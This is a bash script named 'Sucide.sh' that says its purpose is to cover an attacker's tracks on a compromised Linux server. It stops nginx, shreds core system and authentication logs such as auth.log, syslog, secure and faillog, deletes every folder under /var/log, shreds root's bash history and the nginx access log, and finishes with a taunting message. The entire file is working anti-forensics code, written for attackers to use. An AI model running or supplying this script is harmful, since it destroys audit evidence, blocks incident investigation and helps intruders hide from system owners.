#!/bin/bash
#############################################################
#							    							#
# Script   : Sucide.sh				    					#
# Function : This Script Covers the tracks on the system.	#	
#			 Making it hard to investigate further			#
#															#
# Goal : To make it hard to trace the backend server, trying#
#		 to make investigators spend more time				# 
#		 wherever an attacker can.							#
#	     					            					# 
# Coded By : Shubham Tandlekar			            		#
# 						  	    							#
#############################################################

clear
echo " "
echo " "
echo " "
echo "$(tput setaf 3)[+++] $(tput setaf 1)Sucide Script Started"
echo " "

#Stopping Nginx Service to avoid any problems while deleting the files
/bin/systemctl stop nginx.service


for file in /var/log/*; do

	echo " "
	echo "$(tput setaf 3)[+] $(tput setaf 2)Permenantly Wiping the files"
	echo " "

	#If the file/folder Exists
	if [ -e $file ];
	then
		
		#if it is a file
		if [ -f $file ];
		then
			if [ $file == "/var/log/messages" ] || [ $file == "/var/log/syslog" ] || [ $file == "/var/log/auth.log" ] || [ $file == "/var/log/secure" ] || [ $file == "/var/log/boot.log" ] || [ $file == "/var/log/dmesg" ] || [ $file == "/var/log/kern.log" ] || [ $file == "/var/log/faillog" ] || [ $file == "/var/log/cron" ]	|| [ $file == "/var/log/yum.log" ] || [ $file == "/var/log/mail.log" ] || [ $file == "/var/log/maillog" ] || [ $file == "/var/log/httpd" ] || [ $file == "/var/log/mysql.log" ] || [ $file == "/var/log/mysqld.log" ];
			then
				
				#Add random data to the file 5 times, rename the file 5 times and then Delete it.
				shred -fuv -n 5 $file
			else 
				echo
			fi
		
		#If it is a folder type
		elif [ -d $file ];
		then
			echo " "
			echo "$(tput setaf 3)[+] Deleteting the folder  in $file "
			echo " "
			rm -rf $file
		
		else
			echo
		fi
	fi
done

# Removing Bash History ( It was set to 0, so there is no Bash History but still this is a general script which an attacker can run
# On any server without being worried about the configuration, leaving no chance for the mistakes

echo "$(tput setaf 3)[+] $(tput setaf 2)Removing Bash History"
echo " "
	shred -fuv -n 5 /root/.bash_history
	rm -rf /.bash_history >2&1

# Removing Naginx Configurations and Logs to make it harder for Forensics to recover them
echo "$(tput setaf 3)[+] $(tput setaf 2)Removing Nginx Logs and Configs"
echo " "
	
	shred -fuv -n 5 /var/log/nginx/access.log


# Leftover
echo "$(tput setaf 3)[+] $(tput setaf 2)Removing Everything else - Just a moment"
echo " "
	for rest in /var/log/*; do
	
		echo
		rm -rf $rest
	
	done

echo " "
echo "$(tput setaf 3)[+++] $(tput setaf 2)Hey there! I got your A\$\$ Covered"
tput setaf 7
echo " "